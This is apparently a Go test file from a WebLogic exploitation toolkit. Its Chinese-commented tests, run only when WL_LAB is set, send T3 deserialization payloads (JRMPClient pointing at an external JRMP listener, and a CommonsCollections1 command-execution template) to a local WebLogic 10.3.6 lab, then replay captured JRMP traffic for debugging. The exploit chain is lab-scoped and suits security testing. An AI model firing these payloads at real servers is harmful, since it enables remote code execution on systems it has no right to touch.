package weblogic

import (
	"fmt"
	"net"
	"os"
	"testing"
	"time"
)

// TestJRMPLab 诊断用：把 JRMPClient 载体发给 10.3.6 靶场，指向外部 Java JRMPListener。
// 需要 WL_LAB=1 才执行。
func TestJRMPLab(t *testing.T) {
	if os.Getenv("WL_LAB") == "" {
		t.Skip("set WL_LAB=1 to run lab test")
	}
	p, err := BuildJRMPClientPayload("172.16.0.254", 18899)
	if err != nil {
		t.Fatal(err)
	}
	if err := SendT3Payload("127.0.0.1", 7011, 8*time.Second, p); err != nil {
		t.Fatal(err)
	}
	time.Sleep(5 * time.Second)
}

// TestCC1Direct 直接 T3 投递 CC1 模板，验证模板在 10.3.6（JDK6）上可执行。
func TestCC1Direct(t *testing.T) {
	if os.Getenv("WL_LAB") == "" {
		t.Skip("set WL_LAB=1 to run lab test")
	}
	p := BuildRCEPayloadCC1("bash -c touch${IFS}/tmp/cc1_direct.txt")
	if err := SendT3Payload("127.0.0.1", 7011, 8*time.Second, p); err != nil {
		t.Fatal(err)
	}
	time.Sleep(3 * time.Second)
}

// TestJRMPJavaPayload 用 Java ysoserial JRMPListener 回包中的原始对象字节，
// 通过 Go 监听器回给目标，用于区分「回包格式问题」与「payload 构造问题」。
func TestJRMPJavaPayload(t *testing.T) {
	if os.Getenv("WL_LAB") == "" {
		t.Skip("set WL_LAB=1 to run lab test")
	}
	data, err := os.ReadFile("/tmp/proxy_s2c.bin")
	if err != nil {
		t.Skip("no captured java response")
	}
	// BAVE 对象起始：ACK(16) + Return(1) + 流头(4) + blockdata(2) + 15 = 38
	payload := data[38:]
	lport, closer, err := startJRMPListener(payload)
	if err != nil {
		t.Fatal(err)
	}
	defer closer()
	client, err := BuildJRMPClientPayload("172.16.0.254", lport)
	if err != nil {
		t.Fatal(err)
	}
	if err := SendT3Payload("127.0.0.1", 7011, 8*time.Second, client); err != nil {
		t.Fatal(err)
	}
	time.Sleep(5 * time.Second)
}

// TestJRMPReplay 用抓到的目标 DGC 请求回放给 Go 监听器，保存回包供 JVM 反序列化校验。
func TestJRMPReplay(t *testing.T) {
	if os.Getenv("WL_LAB") == "" {
		t.Skip("set WL_LAB=1 to run lab test")
	}
	req, err := os.ReadFile("/tmp/proxy_c2s.bin")
	if err != nil {
		t.Skip("no captured request")
	}
	payload := BuildCC1PayloadForJRMP("id", "")
	port, closer, err := startJRMPListener(payload)
	if err != nil {
		t.Fatal(err)
	}
	defer closer()

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.Write(req)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 8192)
	var got []byte
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			got = append(got, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	if err := os.WriteFile("/tmp/go_s2c.bin", got, 0644); err != nil {
		t.Fatal(err)
	}
	t.Logf("captured %d response bytes", len(got))
}
